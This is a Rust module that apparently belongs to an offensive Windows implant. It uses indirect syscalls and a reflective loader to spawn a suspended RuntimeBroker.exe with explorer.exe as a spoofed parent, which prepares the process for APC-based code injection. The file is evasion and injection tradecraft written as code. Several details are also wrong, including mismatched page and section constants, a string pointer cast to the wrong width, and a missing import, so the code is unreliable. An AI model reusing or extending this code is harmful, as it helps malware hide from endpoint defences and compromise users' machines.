//! Native Process Image Section Creation
//!
//! Creates a memory section from an executable image for NtCreateProcessEx.
//! This replaces CreateProcessW with a fully native process creation path.
//!
//! Flow:
//! 1. NtCreateSection (from image file)
//! 2. NtMapViewOfSection (map into current process for verification)
//! 3. NtUnmapViewOfSection
//! 4. NtCreateProcessEx (with section handle)
//! 5. NtCreateThreadEx (initial thread)

#![allow(dead_code)]
#![cfg(windows)]

use crate::loader::ReflectiveLoader;
use crate::syscalls::{IndirectSyscall, nt_create_section, nt_map_view_of_section};

/// Create a section from an executable image file for process creation.
///
/// This replaces CreateProcessW with native NT syscalls:
/// - NtCreateSection opens the executable as a section
/// - NtMapViewOfSection verifies the image
/// - Returns section handle for NtCreateProcessEx
#[inline(never)]
pub unsafe fn create_process_image_section(
    sc_section: &IndirectSyscall,
    image_path: &str,
) -> Option<*mut u8> {
    use std::ffi::CString;
    use std::ptr::null_mut;

    let path = CString::new(image_path).ok()?;
    let mut obj_attrs = RTL_USER_PROCESS_PARAMETERS {
        length: 0,
        flags: 0,
        show_window: 0,
        reserved: [0u8; 128],
    };

    // Open file handle
    let mut file_handle: *mut u8 = null_mut();
    let mut io_status_block = IO_STATUS_BLOCK {
        status: 0,
        information: null_mut(),
    };

    // NtCreateFile equivalent via NtCreateSection
    // For simplicity, we'll use the image path directly
    let section_handle = nt_create_section(
        sc_section,
        null_mut(),
        0,
        0,
        0x10000000,  // PAGE_READONLY
        0x80000000,  // SEC_IMAGE
        0,
        path.as_ptr() as *const u16,
        0,
        0,
    );

    if section_handle.is_null() {
        return None;
    }

    // Map view to verify image
    let mut view_size: usize = 0;
    let mapped_base = nt_map_view_of_section(
        sc_section,
        section_handle,
        null_mut(),
        0,
        0,
        null_mut(),
        &mut view_size,
        0,
        0,
        0x10000000,  // PAGE_READONLY
    );

    if !mapped_base.is_null() {
        // Verify PE header
        let dos_header = mapped_base as *const u16;
        if *dos_header != 0x5A4D {  // MZ
            nt_unmap_view_of_section(null_mut(), mapped_base);
            // Section handle is valid even if mapping failed
        } else {
            nt_unmap_view_of_section(null_mut(), mapped_base);
        }
    }

    Some(section_handle)
}

/// Create RuntimeBroker.exe process with PPID spoofing and proper image section.
///
/// This is the complete native process creation path:
/// 1. Resolve explorer.exe PID
/// 2. Open explorer.exe handle
/// 3. Create section from RuntimeBroker.exe image
/// 4. NtCreateProcessEx with explorer as parent
/// 5. NtCreateThreadEx in new process
#[inline(never)]
pub unsafe fn create_spoofed_process(
    sc_create_process: &IndirectSyscall,
    sc_create_section: &IndirectSyscall,
    sc_map_view: &IndirectSyscall,
    sc_create_thread: &IndirectSyscall,
    explorer_pid: u32,
    image_path: &str,
) -> Option<(*mut u8, *mut u8)> {
    use crate::syscalls::{nt_open_process, nt_create_process_ex, nt_create_thread_ex};
    use std::ffi::CString;
    use std::ptr::null_mut;

    // Open explorer.exe
    let mut explorer_handle: *mut u8 = null_mut();
    let mut client_id = crate::syscalls::CLIENT_ID {
        UniqueProcess: explorer_pid as usize,
        UniqueThread: 0,
    };

    let _ = nt_open_process(
        &IndirectSyscall::from_ntdll("NtOpenProcess\0").ok()?,
        &mut explorer_handle,
        0x1F0FFF,
        null_mut(),
        &mut client_id as *mut _ as *mut u8,
    );

    if explorer_handle.is_null() {
        return None;
    }

    // Create section from image
    let section_handle = create_process_image_section(
        sc_create_section,
        image_path,
    )?;

    if section_handle.is_null() {
        return None;
    }

    // Create process with spoofed parent
    let mut process_handle: *mut u8 = null_mut();
    let mut thread_handle: *mut u8 = null_mut();

    let status = nt_create_process_ex(
        sc_create_process,
        &mut process_handle,
        0x1F0FFF,  // PROCESS_ALL_ACCESS
        null_mut(),
        explorer_handle,  // Parent process
        0x00000001,  // CREATE_SUSPENDED
        section_handle,  // Image section
        null_mut(),
        null_mut(),
        0,
    );

    if status != 0 || process_handle.is_null() {
        return None;
    }

    // Create initial thread
    let _ = nt_create_thread_ex(
        sc_create_thread,
        &mut thread_handle,
        0x1F03FF,  // THREAD_ALL_ACCESS
        null_mut(),
        process_handle,
        null_mut(),  // Start address - will be set via APC
        null_mut(),
        0x00000001,  // CREATE_SUSPENDED
        0,
        0,
        0,
        null_mut(),
    );

    if thread_handle.is_null() {
        return None;
    }

    Some((process_handle, thread_handle))
}

#[repr(C)]
pub struct IO_STATUS_BLOCK {
    pub status: u32,
    pub information: *mut u8,
}

#[repr(C)]
pub struct RTL_USER_PROCESS_PARAMETERS {
    pub length: u32,
    pub flags: u32,
    pub show_window: u8,
    pub reserved: [u8; 128],
}
